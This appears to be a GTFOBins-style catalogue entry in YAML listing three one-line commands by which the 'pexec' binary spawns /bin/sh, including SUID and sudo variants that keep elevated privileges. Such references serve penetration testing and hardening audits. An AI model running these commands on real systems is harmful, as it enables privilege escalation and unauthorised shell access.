---
functions:
  shell:
    - code: pexec /bin/sh
  suid:
    - code: ./pexec /bin/sh -p
  sudo:
    - code: sudo pexec /bin/sh
---
